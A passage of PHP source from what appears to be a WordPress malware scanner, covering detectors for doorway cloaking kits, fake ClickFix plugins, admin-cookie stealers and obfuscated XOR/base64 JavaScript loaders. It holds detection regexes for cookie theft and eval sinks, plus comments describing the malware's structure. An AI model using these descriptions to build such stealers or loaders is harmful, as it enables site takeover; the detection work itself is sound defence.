		// to ordinary-looking names - the score fell from 6 to 1 and the
		// kit-level finding disappeared entirely. The individual shells were
		// still caught, but the operator lost the one statement that matters
		// most during a clean-up: these files are ONE kit, and here is its
		// root. Rename-resistant cues follow, drawn from what the kit cannot
		// change without breaking itself.
		$cfg = self::find_cloak_config_near( $core, dirname( $core ) );
		if ( $cfg ) {
			$score += 3;
			$tells[] = 'cloaking configuration at ' . self::display_path( $cfg['path'] )
				. ' (' . count( $cfg['profile']['present'] ) . ' keys, '
				. implode( ', ', $cfg['profile']['sized'] ) . ')';
		}

		// The redirector cue reads and normalises PHP, so it is the expensive
		// one. It contributes 2, which alone can never reach the threshold of
		// 3, so on a directory that has shown nothing it is work whose result
		// cannot change the outcome. Compute it only once something else has.
		$reader = $score > 0 ? self::find_cloak_config_reader( $core ) : [];
		if ( $reader ) {
			$score += 2;
			$tells[] = 'visitor-filtering redirector at ' . self::display_path( $reader['path'] )
				. ' (reads ' . $reader['flags'] . ' cloak switches, then redirects)';
		}

		return [ 'score' => $score, 'tells' => $tells, 'config' => $cfg, 'reader' => $reader ];
	}

	/**
	 * 1.4.48: find a doorway kit's cloaking configuration near a candidate
	 * directory.
	 *
	 * The config is the one component the kit cannot rewrite freely: its keys
	 * are read as literal subscripts by the kit's own PHP, and the blocklists
	 * inside it are the working capital of the operation - a hundred thousand
	 * addresses of crawler and scanner infrastructure that took effort to
	 * assemble. A folder rename costs the attacker nothing; regenerating that
	 * costs them the campaign.
	 *
	 * Looked for in the candidate directory, its parent, and a `config`
	 * directory under either - not by name, since the file was `settings.json`
	 * in the samples but need not be. Bounded to 60 JSON files, and the
	 * profiler's own head pre-filter means large ones are not parsed.
	 *
	 * A located config only counts when it implies the SAME kit root as the
	 * candidate directory. Without that test the check walks up a level too
	 * far and names the parent of the kit - which, for a kit dropped in the
	 * web root, is the web root itself. Reporting a site's own document root
	 * as a backdoor kit is the false positive that teaches an operator to stop
	 * reading findings, so the test is not optional. It was caught here by
	 * measurement, not by review: the first draft produced exactly that.
	 *
	 * @param string $core     Candidate kit sub-directory.
	 * @param string $kit_root The kit root the caller has inferred.
	 * @return array<string, mixed> Empty when nothing qualifies.
	 */
	private static function find_cloak_config_near( string $core, string $kit_root ): array {
		$dirs      = [ $core, $core . '/config', dirname( $core ), dirname( $core ) . '/config' ];
		$want_root = realpath( $kit_root );
		if ( ! $want_root ) return [];
		$seen = [];
		$n    = 0;

		foreach ( $dirs as $dir ) {
			$real = realpath( $dir );
			if ( ! $real || isset( $seen[ $real ] ) || ! is_dir( $real ) ) continue;
			$seen[ $real ] = true;

			foreach ( (array) @scandir( $real ) as $name ) {
				if ( $name === '.' || $name === '..' ) continue;
				if ( substr( strtolower( $name ), -5 ) !== '.json' ) continue;
				if ( ++$n > 60 ) return [];
				$path = $real . DIRECTORY_SEPARATOR . $name;
				if ( ! is_file( $path ) ) continue;
				if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) continue;

				$profile = self::cloak_config_profile( $path );
				if ( ! $profile ) continue;

				// A config sitting in <kit>/config/ implies <kit>; one sitting
				// directly in <kit> implies <kit>.
				$parent      = dirname( $path );
				$implied     = ( strtolower( basename( $parent ) ) === 'config' ) ? dirname( $parent ) : $parent;
				$implied_real = realpath( $implied );
				if ( ! $implied_real || $implied_real !== $want_root ) continue;

				return [ 'path' => $path, 'profile' => $profile, 'kit_root' => $implied_real ];
			}
		}

		return [];
	}

	/**
	 * 1.4.48: find the PHP in a candidate directory that consumes a cloaking
	 * configuration and acts on it.
	 *
	 * Two conditions, both required. The file must read the cloak switches by
	 * name as array subscripts - `$settings['black_org']` - which is the half
	 * that cannot be renamed independently of the config. And it must actually
	 * send the visitor somewhere, by header or by scripted location change,
	 * which is the half that makes it a redirector rather than a filter.
	 *
	 * Either alone is ordinary: plenty of legitimate code redirects, and a
	 * firewall plugin may well hold deny lists. Together, in a file that also
	 * sits beside a hundred-thousand-entry blocklist, they are the engine.
	 *
	 * @param string $core Candidate kit sub-directory.
	 * @return array<string, mixed> Empty when nothing qualifies.
	 */
	private static function find_cloak_config_reader( string $core ): array {
		if ( ! class_exists( 'WPS_Indicators' ) || ! method_exists( 'WPS_Indicators', 'doorway_cloak_flag_keys' ) ) {
			return [];
		}
		$flags = WPS_Indicators::doorway_cloak_flag_keys();
		$n     = 0;

		foreach ( (array) @scandir( $core ) as $name ) {
			if ( $name === '.' || $name === '..' ) continue;
			if ( strtolower( pathinfo( $name, PATHINFO_EXTENSION ) ) !== 'php' ) continue;
			if ( ++$n > 60 ) break;

			$path = $core . DIRECTORY_SEPARATOR . $name;
			if ( ! is_file( $path ) ) continue;
			$size = @filesize( $path );
			if ( $size === false || $size < 256 || $size > 1048576 ) continue;

			$raw = @file_get_contents( $path );
			if ( $raw === false ) continue;
			// 1.4.47: shared per-scan normalisation, so this costs nothing the
			// other content checks have not already paid for.
			$src = class_exists( 'WPS_Utils' ) ? WPS_Utils::normalised( $path, $raw ) : $raw;

			$hits = 0;
			foreach ( $flags as $flag ) {
				if ( preg_match( '/\[\s*[\'"]' . preg_quote( $flag, '/' ) . '[\'"]\s*\]/i', $src ) ) $hits++;
			}
			if ( $hits < 4 ) continue;

			$redirects = (bool) preg_match(
				'/header\s*\(\s*[\'"]\s*Location\s*:|window\.location\.(replace|href|assign)|http_response_code\s*\(\s*30[1237]/i',
				$src
			);
			if ( ! $redirects ) continue;

			return [ 'path' => $path, 'flags' => $hits ];
		}

		return [];
	}


	/**
	 * Walk `wp-content/plugins/` for fake-plugin-shaped folders that the
	 * per-prefix slug list does not yet cover. See the comment block above
	 * for the heuristic rationale.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_clickfix_shape_heuristic(): array {
		$found = [];
		if ( ! defined( 'WP_PLUGIN_DIR' ) ) return $found;
		$plugin_root = rtrim( WP_PLUGIN_DIR, '/\\' );
		if ( ! is_dir( $plugin_root ) ) return $found;

		$allowlist        = self::clickfix_heuristic_allowlist();
		$blocked_slugs    = WPS_Blocker::get_blocked_slugs(); // already-known prefixes; skip rescoring those
		$blocked_basename = array_map( 'strtolower', $blocked_slugs );

		$entries = @scandir( $plugin_root );
		if ( ! is_array( $entries ) ) return $found;

		foreach ( $entries as $slug ) {
			if ( $slug === '.' || $slug === '..' ) continue;
			$plugin_dir = $plugin_root . DIRECTORY_SEPARATOR . $slug;
			if ( ! is_dir( $plugin_dir ) ) continue;
			if ( in_array( $slug, $allowlist, true ) ) continue;

			// Skip if the slug is already on the per-prefix blocklist  the
			// per-prefix detection already covers it.
			$slug_lower = strtolower( $slug );
			$on_blocklist = false;
			foreach ( $blocked_basename as $blocked ) {
				if ( strpos( $slug_lower, $blocked ) !== false ) { $on_blocklist = true; break; }
			}
			if ( $on_blocklist ) continue;

			// Look for the main PHP file at <slug>/<slug>.php, or fall back to
			// <slug>/index.php. The GoDaddy-documented variant of this family
			// ships the payload as a lone index.php rather than <slug>.php, so
			// without the fallback the heuristic would skip that shape entirely.
			$main_php = $plugin_dir . DIRECTORY_SEPARATOR . $slug . '.php';
			if ( ! is_file( $main_php ) ) {
				$main_php = $plugin_dir . DIRECTORY_SEPARATOR . 'index.php';
			}
			if ( ! is_file( $main_php ) ) continue;

			$main_size = (int) @filesize( $main_php );
			$contents  = @file_get_contents( $main_php );
			if ( ! is_string( $contents ) || $contents === '' ) continue;

			$result = self::clickfix_score_candidate( $plugin_dir, $slug, $main_php, $main_size, $contents );
			$score  = $result['score'];
			if ( $score < 3 ) continue;

			// Severity mapping
			$severity    = $score >= 4 ? 'high' : 'medium';
			$auto_delete = $score >= 5; // only on very high confidence
			$author_note = $result['author_match'] ? ' Author field also matches the shell-company list.' : '';

			$found[] = [
				'severity'    => $severity,
				'type'        => 'Fake-plugin-folder ClickFix shape (' . $score . '/6 structural traits)',
				'subject'     => $slug . ' (' . $score . '/6 traits)',
				'path'        => $plugin_dir,
				'action'      => 'Plugin folder at wp-content/plugins/' . $slug . '/ matches the ClickFix render-hijacker family by structural traits, even though its slug is not in the per-prefix IoC catalogue. Matched traits: ' . implode( '; ', $result['traits'] ) . '.' . $author_note . ' '
					. ( $auto_delete
						? 'Confidence is very high (5+/6 traits matched); auto-delete is enabled. Verify the deletion via the post-remediation cache invalidation checklist (object cache  page cache  Plesk WP Toolkit  PHP OPcache  Nginx  CDN edge  browser).'
						: 'Confidence is moderate (3-4/6 traits); review the file manually before deletion. If the file is a legitimate niche plugin that happens to match these traits, the operator can confirm and dismiss the finding.' ),
				'auto_delete' => $auto_delete,
				'delete_path' => $auto_delete ? $plugin_dir : '',
			];
			WPS_Logger::log_event( 'clickfix_shape_match', 'slug=' . $slug . ' score=' . $score . ' severity=' . $severity );
		}

		return $found;
	}

	/**
	 * Detect plugins whose header carries a reserved RFC 2606 placeholder
	 * domain (example.com/.org/.net/.edu) in the Plugin URI or Author URI
	 * (added 1.3.75).
	 *
	 * GoDaddy documented this as a defining tell of the fake-plugin ClickFix
	 * campaign: the operator copies a real plugin's metadata into a lone
	 * bootstrap file but leaves an example.com URI behind. Legitimate plugins
	 * never ship a placeholder URI, so this is a near-zero-false-positive
	 * signal. Flagged for review with a delete button rather than auto-deleted,
	 * since an abandoned developer scaffold could in principle trip it.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_plugin_metadata_camouflage(): array {
		$found = [];
		if ( ! defined( 'WP_PLUGIN_DIR' ) ) {
			return $found;
		}
		$plugin_root = rtrim( WP_PLUGIN_DIR, '/\\' );
		if ( ! is_dir( $plugin_root ) ) {
			return $found;
		}

		$allowlist = self::clickfix_heuristic_allowlist();
		$entries   = @scandir( $plugin_root );
		if ( ! is_array( $entries ) ) {
			return $found;
		}

		foreach ( $entries as $slug ) {
			if ( $slug === '.' || $slug === '..' ) {
				continue;
			}
			$plugin_dir = $plugin_root . DIRECTORY_SEPARATOR . $slug;
			if ( ! is_dir( $plugin_dir ) || in_array( $slug, $allowlist, true ) ) {
				continue;
			}

			foreach ( [ $plugin_dir . DIRECTORY_SEPARATOR . $slug . '.php', $plugin_dir . DIRECTORY_SEPARATOR . 'index.php' ] as $main_php ) {
				if ( ! is_file( $main_php ) ) {
					continue;
				}
				$head = @file_get_contents( $main_php, false, null, 0, 8192 );
				if ( ! is_string( $head ) || stripos( $head, 'Plugin Name:' ) === false ) {
					continue; // only files carrying a real plugin header
				}

				// Placeholder / reserved URIs that no real plugin ships as its home:
				// the example.* reserved domains (GoDaddy's documented tell) and the
				// developer.wordpress.org/plugins boilerplate landing that the
				// externalized-payload variants (page-image-scanner, ultra-layout-
				// scanner) leave in place. The pattern requires the "developer."
				// host so a legitimate wordpress.org/plugins/<slug>/ directory link
				// is never matched.
				$placeholder = '#example\.(?:com|org|net|edu)|developer\.wordpress\.org/plugins#i';
				$bad_uri = '';
				if ( preg_match( '/Plugin URI:\s*(\S+)/i', $head, $pm ) && preg_match( $placeholder, $pm[1] ) ) {
					$bad_uri = 'Plugin URI ' . $pm[1];
				} elseif ( preg_match( '/Author URI:\s*(\S+)/i', $head, $aum ) && preg_match( $placeholder, $aum[1] ) ) {
					$bad_uri = 'Author URI ' . $aum[1];
				}
				if ( $bad_uri === '' ) {
					continue;
				}

				$found[] = [
					'severity'    => 'high',
					'type'        => 'Plugin header uses a reserved placeholder URI (camouflage tell)',
					'subject'     => $slug,
					'path'        => $plugin_dir,
					'action'      => 'The plugin at wp-content/plugins/' . $slug . '/ carries a reserved placeholder domain in its header (' . $bad_uri . '). GoDaddy documented this tell for the fake-plugin ClickFix campaign: the operator copies a real plugin\'s metadata into a lone bootstrap file but leaves a placeholder URI (example.com, or the developer.wordpress.org/plugins boilerplate) in place. Legitimate plugins do not ship a placeholder URI. Confirm you installed this plugin; if you do not recognise it, treat it as a malicious injector and delete it.',
					'delete_path' => $plugin_dir,
				];
				WPS_Logger::log_event( 'plugin_metadata_camouflage', 'slug=' . $slug . ' ' . $bad_uri );
				break; // one finding per plugin folder
			}
		}

		return $found;
	}

	private static function check_admin_cookie_stealer(): array {
		$found = [];
		if ( ! defined( 'WP_CONTENT_DIR' ) || ! is_dir( WP_CONTENT_DIR ) ) {
			return $found;
		}
		$self_dir   = realpath( WPS_DIR ) ?: '';
		$known_c2   = WPS_Indicators::cookie_exfil_c2_domains();
		$site_host  = function_exists( 'wp_parse_url' )
			? (string) wp_parse_url( home_url(), PHP_URL_HOST )
			: '';

		// Build the list of paths to inspect: WP_CONTENT_DIR (recursive, capped)
		// plus a non-recursive sweep of ABSPATH for hidden-dot leaders such as
		// .wp-config-cache.php that operators stash at WordPress root.
		$paths_to_scan = [];

		try {
			$iter  = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( WP_CONTENT_DIR, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::LEAVES_ONLY
			);
			$count = 0;
			foreach ( $iter as $f ) {
				if ( ++$count > self::REDROP_MAX_SCAN_FILES ) {
					break;
				}
				if ( ! ( $f instanceof SplFileInfo ) || ! self::is_php_executable( $f ) || ! $f->isReadable() ) {
					continue;
				}
				if ( $f->getSize() > 524288 ) { // 512 KiB cap - stealers are tiny
					continue;
				}
				$paths_to_scan[] = $f->getPathname();
			}
		} catch ( \Exception $e ) {} // phpcs:ignore

		// ABSPATH non-recursive (catches leading-dot hidden filenames that
		// glob('*.php') would miss). scandir() returns dotfiles.
		if ( defined( 'ABSPATH' ) ) {
			$root_entries = @scandir( ABSPATH );
			if ( is_array( $root_entries ) ) {
				foreach ( $root_entries as $entry ) {
					if ( $entry === '.' || $entry === '..' ) {
						continue;
					}
					if ( substr( $entry, -4 ) !== '.php' ) {
						continue;
					}
					$full = ABSPATH . $entry;
					if ( ! is_file( $full ) || ! is_readable( $full ) ) {
						continue;
					}
					$sz = @filesize( $full );
					if ( $sz === false || $sz > 524288 ) {
						continue;
					}
					$paths_to_scan[] = $full;
				}
			}
		}

		// Trait regexes. Each one fires per-file; the gate requires all four.
		$rx_shutdown = '/register_shutdown_function\s*\(/i';
		$rx_admin    = '/(?:current_user_can\s*\(\s*[\'"]administrator[\'"]|in_array\s*\(\s*[\'"]administrator[\'"]\s*,|->roles\b[^;]{0,80}administrator|wp_get_current_user\s*\()/i';
		$rx_postout  = '/(?:wp_remote_post|wp_remote_request|curl_setopt|file_get_contents\s*\(\s*[\'"]https?:\/\/)/i';
		$rx_cookie   = '/(?:wordpress_|wp-|wp_)[^"\']{0,40}\$_COOKIE|\$_COOKIE\s*[^;]{0,60}wordpress|\bsetcookie\s*\(\s*[\'"]wordpress/i';

		foreach ( $paths_to_scan as $path ) {
			$real = realpath( $path );
			if ( $self_dir !== '' && $real && strpos( $real, $self_dir ) === 0 ) {
				continue;
			}

			$contents = @file_get_contents( $path );
			if ( ! is_string( $contents ) || $contents === '' || self::is_whitelisted( $contents ) ) {
				continue;
			}

			// Structural gate: ALL four traits must be present.
			if ( ! preg_match( $rx_shutdown, $contents ) ) continue;
			if ( ! preg_match( $rx_admin,    $contents ) ) continue;
			if ( ! preg_match( $rx_postout,  $contents ) ) continue;
			if ( ! preg_match( $rx_cookie,   $contents ) ) continue;

			// Extract the destination host. Known-bad list first; then any
			// hostname literal that is not the site itself, not WP.org, not
			// Gravatar, and not a plugin-update CDN.
			$matched_host = '';
			$known_hit    = false;
			foreach ( $known_c2 as $bad ) {
				if ( stripos( $contents, $bad ) !== false ) {
					$matched_host = $bad;
					$known_hit    = true;
					break;
				}
			}
			if ( $matched_host === '' && preg_match_all( '#https?://([a-z0-9.\-]+)#i', $contents, $hm ) ) {
				$benign = [
					'wordpress.org', 'api.wordpress.org', 'downloads.wordpress.org',
					'gravatar.com', 'secure.gravatar.com', 'www.gravatar.com',
					'plugins.svn.wordpress.org', 'translate.wordpress.org',
				];
				if ( $site_host !== '' ) {
					$benign[] = strtolower( $site_host );
				}
				foreach ( $hm[1] as $host ) {
					$hl = strtolower( $host );
					$is_benign = false;
					foreach ( $benign as $b ) {
						if ( $hl === $b || ( strlen( $hl ) > strlen( $b ) && substr( $hl, -strlen( $b ) - 1 ) === '.' . $b ) ) {
							$is_benign = true;
							break;
						}
					}
					if ( ! $is_benign ) {
						$matched_host = $host;
						break;
					}
				}
			}
			if ( $matched_host === '' ) {
				// Four traits present but no extractable external host. Lower
				// confidence; report for manual review rather than auto-delete.
				$found[] = [
					'severity' => 'high',
					'type'     => 'Admin-cookie stealer structure without resolvable C2 host',
					'subject'  => basename( $path ),
					'path'     => $path,
					'match'    => 'register_shutdown_function + administrator check + outbound post + wordpress_* cookie reference',
					'action'   => 'This file combines four traits that together strongly suggest an admin-session-cookie stealer: a shutdown hook, an administrator-role check, an outbound HTTP call, and a reference to WordPress login cookies. The destination host could not be auto-extracted, so confirm the file manually before removing it. If unfamiliar, delete it and rotate auth salts via Hardening > Regenerate auth salts.',
				];
				WPS_Logger::log_event( 'admin_cookie_stealer_unresolved', 'path=' . $path );
				continue;
			}

			$severity_note = $known_hit
				? ' Destination is a known cookie-exfil C2 (' . $matched_host . ').'
				: ' Destination ' . $matched_host . ' is external to this site and not a WordPress / Gravatar host.';

			$found[] = [
				'severity'    => 'critical',
				'type'        => 'Admin-session-cookie stealer (structural match)',
				'subject'     => basename( $path ) . ' -> ' . $matched_host,
				'path'        => $path,
				'match'       => 'shutdown+admin+post+cookie -> ' . $matched_host,
				'action'      => 'Confirmed admin-cookie stealer. Hooks register_shutdown_function on admin-role page loads and posts WordPress session cookies to an external host.' . $severity_note . ' Auto-deleted because the structural quartet has no benign explanation. After deletion: rotate auth salts via Hardening > Regenerate auth salts (this invalidates any cookies the operator may have already harvested), then look for the entry point (stolen credentials, vulnerable plugin, or compromised hosting account).',
				'auto_delete' => $known_hit, // only auto-delete when host is on the C2 list
				'delete_path' => $path,
			];
			WPS_Logger::log_event( 'admin_cookie_stealer_confirmed', 'path=' . $path . ' host=' . $matched_host . ' known_c2=' . ( $known_hit ? '1' : '0' ) );
		}

		return $found;
	}

	/**
	 * Detect the theme-modifying loader family identified by Plugin-7e4eb3ff
	 * (added 1.3.79).
	 *
	 * This is a DIFFERENT shape from the wp_options-stored ClickFix family. The
	 * payload sits in a plugin folder named Plugin-<8hex> (or similar generic
	 * placeholder name), its main file defines a function family with the same
	 * <8hex> prefix (e.g. i7e4eb3ff_get_css_js_content,
	 * i7e4eb3ff_header_has_css_js_script), it writes JavaScript to
	 * <active-theme>/css.js, and it injects a <script src=".../css.js"> tag by
	 * modifying the theme's header. The JavaScript inside the heredoc uses a
	 * hex-array + RC4-style decoder; bot-cloaks the same admin/cron/login paths
	 * as the rest of the campaign; and resolves to the campaign's known C2 and
	 * EtherHiding indicators after deobfuscation.
	 *
	 * Detection cues, any TWO of which are sufficient:
	 *   a. Plugin slug matching ^Plugin-[a-f0-9]{6,10}$ at wp-content/plugins/
	 *   b. A function with name pattern [a-z]?[a-f0-9]{6,10}_(get_css_js_content|script_tag|header_has_css_js_script)
	 *   c. get_template_directory_uri() . '/css.js' literal
	 *   d. A heredoc payload >50KB containing the hex-array pattern
	 *      a[0-9a-f]+_0x[0-9a-f]+ with at least 200 entries
	 *
	 * Matching on two cues keeps false positives near zero (legitimate plugins
	 * do not pair a "Plugin-<8hex>" generic name with theme-directory script
	 * injection) while catching trivial slug rotations.
	 *
	 * @return array<int, array<string, mixed>>
	 */
	private static function check_theme_loader_plugin(): array {
		$found = [];
		if ( ! defined( 'WP_PLUGIN_DIR' ) ) {
			return $found;
		}
		$plugin_root = rtrim( WP_PLUGIN_DIR, '/\\' );
		if ( ! is_dir( $plugin_root ) ) {
			return $found;
		}

		$entries = @scandir( $plugin_root );
		if ( ! is_array( $entries ) ) {
			return $found;
		}

		$rx_slug    = '/^Plugin-[a-f0-9]{6,10}$/i';
		$rx_func    = '/function\s+[a-z]?[a-f0-9]{6,10}_(?:get_css_js_content|get_script_tag|header_has_css_js_script|css_js_content)\b/i';
		$rx_themejs = '/get_template_directory_uri\s*\(\s*\)\s*\.\s*[\'"][^\'"]*css\.js[\'"]/i';
		$rx_hexarr  = '/a[0-9a-f]{1,2}_0x[0-9a-f]{3,5}/';

		foreach ( $entries as $slug ) {
			if ( $slug === '.' || $slug === '..' ) {
				continue;
			}
			$plugin_dir = $plugin_root . DIRECTORY_SEPARATOR . $slug;
			if ( ! is_dir( $plugin_dir ) ) {
				continue;
			}
			if ( in_array( $slug, self::clickfix_heuristic_allowlist(), true ) ) {
				continue;
			}

			// Locate the main file. Try <slug>/<slug>.php then <slug>/index.php.
			$main = $plugin_dir . DIRECTORY_SEPARATOR . $slug . '.php';
			if ( ! is_file( $main ) ) {
				$main = $plugin_dir . DIRECTORY_SEPARATOR . 'index.php';
			}
			if ( ! is_file( $main ) || ! is_readable( $main ) ) {
				continue;
			}

			$size = (int) @filesize( $main );
			// The captured sample is 130 KiB. Allow 20 KiB - 2 MiB to cover
			// variants while skipping tiny placeholder files.
			if ( $size < 20480 || $size > 2097152 ) {
				continue;
			}

			$contents = @file_get_contents( $main );
			if ( ! is_string( $contents ) || $contents === '' ) {
				continue;
			}

			$cues = [];

			// Cue a: slug shape.
			if ( preg_match( $rx_slug, $slug ) ) {
				$cues[] = 'slug matches Plugin-<6-10 hex>';
			}

			// Cue b: function name family.
			if ( preg_match( $rx_func, $contents, $fm ) ) {
				$cues[] = 'function family: ' . $fm[0];
			}

			// Cue c: theme-directory script injection literal.
			if ( preg_match( $rx_themejs, $contents ) ) {
				$cues[] = 'get_template_directory_uri() . "/css.js" injection';
			}

			// Cue d: hex-array obfuscator with sufficient density.
			if ( preg_match_all( $rx_hexarr, $contents, $hm ) && count( $hm[0] ) >= 200 ) {
				$cues[] = 'hex-array obfuscator (' . count( $hm[0] ) . ' references)';
			}

			if ( count( $cues ) < 2 ) {
				continue;
			}

			$auto_delete = count( $cues ) >= 3;

			$found[] = [
				'severity'    => $auto_delete ? 'critical' : 'high',
				'type'        => 'Theme-modifying loader plugin (Plugin-<8hex> family)',
				'subject'     => $slug . ' (' . count( $cues ) . '/4 cues)',
				'path'        => $plugin_dir,
				'match'       => implode( '; ', $cues ),
				'action'      => 'Plugin folder at wp-content/plugins/' . $slug . '/ matches the theme-modifying loader family observed in the rembat.my forensic dump. This family is structurally distinct from the wp_options-stored ClickFix variants: the payload sits in a heredoc inside the plugin file, the plugin emits a <script src="<theme>/css.js"></script> tag, and the JavaScript inside uses a hex-array + RC4-style obfuscator with the same bot-cloaking and on-chain indicators as the rest of the campaign. Cues matched: ' . implode( '; ', $cues ) . '. '
					. ( $auto_delete
						? 'Confidence is high (3+ cues); auto-delete is enabled. Also inspect the active theme for a planted css.js file and for header.php modifications that include the script tag, and remove those alongside the plugin.'
						: 'Confidence is moderate (2 cues); review before deletion. If you did not deliberately install a plugin with this generic Plugin-<hex> name, treat it as the loader family and remove it along with any css.js file under your active theme and any header.php block that calls the plugin\'s function.' ),
				'auto_delete' => $auto_delete,
				'delete_path' => $auto_delete ? $plugin_dir : '',
			];
			WPS_Logger::log_event( 'theme_loader_plugin_match', 'slug=' . $slug . ' cues=' . count( $cues ) );
		}

		return $found;
	}

	/**
	 * Detect the XOR+base64 self-decoding loader used by this ClickFix campaign
	 * (added 1.3.78), matched by STRUCTURE rather than by literal variable names.
	 *
	 * The literal signatures elsewhere (`s.charCodeAt(i)^k`,
	 * `new TextDecoder().decode(r)`) assume the variable names of one captured
	 * sample. Variants randomise those names (XOR keys 84, 113, 114, and 179
	 * have been seen, each with different identifiers), and the campaign's
	 * cleartext indicators (eth_call, _wp_perf_ok, the contract address, the RPC
	 * hosts) live inside the base64 blob, so a raw substring scan of the file
	 * never sees them. This check gates on the loader's structural fingerprint
	 * (an atob/base64_decode blob, a charCodeAt(...)^key XOR loop, a
	 * TextDecoder/fromCharCode pass, and a new Function()/eval() sink), then
	 * base64-decodes the blob and brute-forces the single-byte XOR the loader
	 * applies, recovering the payload, the key, the contract, and the chain RPC
	 * hosts. A campaign indicator inside a recovered decode is proof.
	 *
	 * The cheap regex gate runs per file; the costly brute only runs on the few
	 * files that already match the full structure, so the common case stays fast
	 * and false positives stay near zero.
	 *
	 * @return array<int, array<string, mixed>>
	 */
	private static function check_obfuscated_loader(): array {
		$found = [];
		if ( ! defined( 'WP_CONTENT_DIR' ) || ! is_dir( WP_CONTENT_DIR ) ) {
			return $found;
		}
		$self_dir = realpath( WPS_DIR ) ?: '';

		$rx_atob = '/(?:atob|base64_decode)\s*\(/i';
		$rx_xor  = '/charCodeAt\s*\([^)]{0,40}\)\s*\^/i';
		$rx_sink = '/(?:new\s+Function\s*\(|eval\s*\()/i';
		$rx_dec  = '/(?:new\s+TextDecoder\s*\(\)\s*\.\s*decode\s*\(|fromCharCode\s*\()/i';

		// Cleartext campaign indicators expected to surface after de-obfuscation.
		$payload_iocs = [ 'eth_call', '_wp_perf_ok', '_cf_verified', 'cf-captcha-verified', 'tds-dismiss', 'clipboard-write', 'eth_getStorageAt' ];

		$count = 0;
		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( WP_CONTENT_DIR, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::LEAVES_ONLY
			);
			foreach ( $iter as $f ) {
				if ( ++$count > self::REDROP_MAX_SCAN_FILES ) {
					break;
				}
				if ( ! ( $f instanceof SplFileInfo ) || ! self::is_php_executable( $f ) || ! $f->isReadable() ) {
					continue;
				}
				if ( $f->getSize() > 2097152 ) { // 2 MiB cap
					continue;
				}
				$path = $f->getPathname();
				$real = realpath( $path );
				if ( $self_dir !== '' && $real && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) {
					continue;
				}

				$contents = @file_get_contents( $path );
				if ( $contents === false || $contents === '' || self::is_whitelisted( $contents ) ) {
					continue;
				}

				// Structural gate: require the whole wrapper shape to co-occur.
				if ( ! preg_match( $rx_atob, $contents ) || ! preg_match( $rx_xor, $contents )
					|| ! preg_match( $rx_sink, $contents ) || ! preg_match( $rx_dec, $contents ) ) {
					continue;
				}

				// Recover the payload: base64-decode each blob and brute the
				// single-byte XOR the loader applies after atob().
				$xor_key  = -1;
				$hit_iocs = [];
				$detail   = '';
				if ( preg_match_all( '/(?:atob|base64_decode)\s*\(\s*[\'"]([A-Za-z0-9+\/=]{120,})[\'"]/', $contents, $mm ) ) {
					foreach ( array_slice( $mm[1], 0, 4 ) as $blob ) {
						$raw = base64_decode( $blob, true );
						if ( $raw === false || strlen( $raw ) < 32 ) {
							continue;
						}
						if ( strlen( $raw ) > 262144 ) {
							$raw = substr( $raw, 0, 262144 ); // cap 256 KiB
						}
						$len = strlen( $raw );
						for ( $k = 0; $k <= 255; $k++ ) {
							$dec = $raw ^ str_repeat( chr( $k ), $len );
							if ( stripos( $dec, 'eth_call' ) === false && stripos( $dec, 'cf-captcha-verified' ) === false ) {
								continue;
							}
							foreach ( $payload_iocs as $ioc ) {
								if ( stripos( $dec, $ioc ) !== false ) {
									$hit_iocs[] = $ioc;
								}
							}
							$xor_key = $k;
							if ( preg_match( '/0x[0-9a-fA-F]{40}/', $dec, $cm ) ) {
								$detail .= ' contract=' . $cm[0];
							}
							if ( preg_match_all( '#https?://[a-z0-9.\-]+\.(?:org|com|build|network|app)#i', $dec, $hm ) ) {
								$detail .= ' chain_rpc=' . implode( ',', array_slice( array_unique( $hm[0] ), 0, 6 ) );
							}
							break 2; // recovered
						}
					}
				}

				if ( $xor_key >= 0 ) {
					$hit_iocs = array_values( array_unique( $hit_iocs ) );
					$found[]  = [
						'severity'    => 'critical',
						'type'        => 'ClickFix self-decoding loader (XOR+base64), confirmed by de-obfuscation',
						'subject'     => $f->getFilename(),
						'path'        => $path,
						'action'      => 'Confirmed ClickFix injector. WP Perf Shield base64-decoded and XOR-deobfuscated the embedded blob (single-byte key ' . $xor_key . ') and recovered campaign indicators: ' . implode( ', ', $hit_iocs ) . '.' . $detail
							. ' If this is a standalone dropper (a fake plugin, an mu-plugin, or a wp-content drop-in such as db.php / object-cache.php / advanced-cache.php), delete it. If the block was appended to a legitimate file such as a theme functions.php, remove only the injected block rather than deleting the whole file. Then close the entry point (stolen credentials or a vulnerable plugin) so it does not return.',
						'match'       => 'xor' . $xor_key . '+base64 loader',
						'delete_path' => $path,
					];
					WPS_Logger::log_event( 'obfuscated_loader_confirmed', 'path=' . $path . ' key=' . $xor_key . ' iocs=' . implode( '|', $hit_iocs ) );
				} else {
					// Structure present but payload not auto-recovered (format/key
					// variant). Still high-signal; report for manual review only.
					$found[] = [
						'severity'    => 'high',
						'type'        => 'Self-decoding JS loader structure (atob + XOR + new Function)',
						'subject'     => $f->getFilename(),
						'path'        => $path,
						'action'      => 'This file carries the structural fingerprint of the ClickFix self-decoding loader (a base64 blob, a charCodeAt(...)^key XOR loop, a TextDecoder/fromCharCode pass, and a new Function()/eval() sink), but the payload could not be auto-recovered, so confirm before acting. Legitimate code very rarely combines all four. Inspect the file; if you did not deliberately install it, treat it as an injector and remove the offending block or file.',
						'match'       => 'atob+xor+Function loader shape',
						'delete_path' => $path,
					];
					WPS_Logger::log_event( 'obfuscated_loader_structure', 'path=' . $path );
				}
			}
		} catch ( \Exception $e ) {} // phpcs:ignore

		return $found;
	}


	/**
	 * Detect the obfuscated JS injector / theme-css.js dropper family (added 1.3.79).
	 *
	 * Two confirmed samples share this anatomy:
	 *   Plugin-b45b652c  (129 503 bytes)
	 *   Plugin-45e0930c  (127 542 bytes)
	 *
	 * Structure:
	 *   - A lone PHP plugin file; Plugin Name is the 8-hex slug; Description is
	 *     "simple js plugin".
	 *   - A PHP heredoc terminated by ENDPLUGINJS embeds ~130 KB of RC4-obfuscated
	 *     JavaScript (string-array rotation with while(!![]){try{ … }) that the
	 *     plugin writes to the active theme directory as css.js.
